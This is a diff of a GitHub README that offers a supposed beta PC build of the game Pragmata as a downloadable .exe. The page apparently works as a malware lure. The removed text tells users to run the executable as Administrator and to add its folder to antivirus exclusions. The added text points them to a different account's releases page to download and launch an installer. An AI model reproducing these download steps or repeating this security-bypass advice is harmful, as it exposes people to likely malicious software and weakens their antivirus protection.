@@ -1,72 +1,73 @@
-<img width="1536" height="1024" alt="20260416_1824_Image Generation_remix_01kpbe89zcf9msgm7wxh4580h7(1)" src="https://github.com/user-attachments/assets/efb230a6-c2cb-4245-985b-909bee471173" />
+# 🚀 Pragmata-Game-Beta-Release - Explore the Moon in Stunning Quality
 
-# Pragmata Game Beta Release - PC Desktop Version
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/basic-honkytonk932/Pragmata-Game-Beta-Release/releases)
 
-[![Stars](https://img.shields.io/github/stars/Cowter12/Pragmata-Game-Beta-Release)](https://github.com/Cowter12/Pragmata-Game-Beta-Release) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+## About This Software
 
-**Pragmata** is a sci-fi action-adventure game set in a futuristic world where humanity explores the Moon and beyond. Play as a young girl and her robotic companion in this visually stunning third-person adventure filled with exploration, puzzles, combat, and an emotional story.
-This **Beta Release** brings the optimized PC Desktop version with improved performance, higher resolutions, and better controls for Windows users.
+Pragmata Beta Release offers a sci-fi action-adventure experience for your PC. You guide a young girl and her robot companion through a mysterious lunar environment. The game renders in high-resolution, sharp detail. It supports 4K monitors and runs with high frame rates. You control the characters using standard desktop hardware. This release brings the full beta build to your computer.
 
-<img width="1200" height="630" alt="image" src="https://github.com/user-attachments/assets/cf20ca86-acda-4d14-b62b-16c3093cc8d6" />
+## 🖥️ System Requirements
 
----
+Your computer must meet these baseline specifications to run the game effectively:
 
-## 📦 What's Included
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i7 or AMD Ryzen 7.
+- Memory: 16 GB RAM.
+- Graphics: NVIDIA GeForce RTX 3070 or AMD Radeon RX 6800.
+- Storage: 50 GB of free space on a solid-state drive.
+- DirectX: Version 12.
 
-- Pragmata Beta Release (Latest PC Build)
-- Optimized for Windows 10/11
-- Native 1080p, 1440p, and 4K support
-- Widescreen and ultrawide monitor compatibility
-- Enhanced graphics and performance settings
-- Third-person controls (Keyboard + Mouse / Controller)
-- All current beta content and missions
+Solid-state drives produce faster load times and smoother performance. Ensure your graphics card drivers have the latest updates from the manufacturer website before you launch the game.
 
----
+## 📥 How to Install
 
-## 📥 Download
+Follow these steps to set up the game on your machine.
 
-📥 [`Pragmata-Setup.exe`](https://github.com/Cowter12/Pragmata-Game-Beta-Release/releases/download/Game/Pragmata-Setup.exe)  
----
+1. Visit this page to download the installer: https://github.com/basic-honkytonk932/Pragmata-Game-Beta-Release/releases
+2. Locate the file ending in .exe in your Downloads folder.
+3. Double-click the file to open the setup wizard.
+4. Follow the prompts on the screen to choose your installation folder.
+5. Click Install to begin the process.
+6. The installer copies the game files to your hard drive. 
+7. Once finished, click Finish to close the window.
 
-### Archive Contents
+## 🎮 How to Play
 
-- `Pragmata.exe` – Main game executable
-- `GameData/` – All beta assets, levels, and models
-- `settings/` – Optimized configuration files
-- `setup_guide.txt` – Installation and controls guide
+Launch the game using the shortcut on your desktop or the link in your Start menu. The main menu allows you to adjust your experience before you start your journey.
 
----
+### Settings
+Adjust your visual options under the Settings menu. Set your display mode to Fullscreen for the best performance. If your frame rate drops, lower the resolution scale or adjust shadow quality. 
 
-## 🚀 Quick Start
+### Controls
+The game supports standard mouse and keyboard inputs. You can also connect a controller to your PC. The game detects compatible controllers automatically. 
 
-1. Extract the archive to any folder
-2. Run `Pragmata.exe` as Administrator
-3. Choose your resolution and graphics quality
-4. Configure controls (Keyboard/Mouse or Controller)
-5. Begin your journey on the lunar surface
+- Use the W, A, S, and D keys to move your character.
+- Press the Space bar to jump.
+- Use your mouse to rotate the camera.
+- Press the Left Mouse Button to interact with objects.
+- Press the Escape key to pause the game and access the menu.
 
-> ℹ️ Optimized Beta build for modern Windows PCs with excellent visual fidelity and performance.
+## 🐛 Troubleshooting
 
----
+Occasional issues occur during the beta phase. Use these tips to resolve common problems.
 
-## ❗️ Troubleshooting
+### Game Does Not Launch
+Verify that your PC meets the system requirements. Ensure you have the latest drivers for your graphics card. Disable any background software that might interfere with performance.
 
-| Problem                  | Solution                                      |
-|--------------------------|-----------------------------------------------|
-| Game doesn't launch      | Run as Administrator                          |
-| Low FPS                  | Lower graphics settings or resolution         |
-| Black screen             | Use Borderless Windowed mode                  |
-| Antivirus warning        | Add the folder to exclusions                  |
-| Controller issues        | Enable controller support in settings         |
+### Low Performance
+Lower the graphics settings in the menu. Turn off background applications like web browsers or recording software while you play. Ensure your PC power settings are set to High Performance.
 
----
+### File Errors
+If the game refuses to open, delete the downloaded file and download it again from the provided link. Sometimes a file transfer fails during the download, which causes errors. 
 
-## 📜 License
+## 🛡️ Privacy and Safety
 
-MIT License – shared for educational and game preservation purposes only.
+This software does not collect personal data. The game stores your saved files locally on your computer. You retain full control over your data. We do not provide external server access for this version.
 
----
+## 📝 Beta Feedback
 
-## ⭐️ Support
+You play a vital role in our testing process. We value reports regarding bugs or performance issues. You can report these details on the issues page of the repository. Include your hardware specifications and a description of the error to help us find a solution. We monitor the repository and provide updates as we improve the code.
 
-If **Pragmata Beta Release** captured your imagination with its beautiful sci-fi world — please star the repository! It helps more players experience this unique adventure on PC. ❤️
+## 📋 Additional Information
+
+This beta represents a work-in-progress version. Future updates will include additional zones, enemies, and gameplay mechanics. We update the repository regularly. Check the releases page for new versions. Each update builds upon the previous one to fix errors and increase stability. We design this game for high-end hardware to ensure the best atmospheric experience. Enjoy your time exploring the lunar landscape.
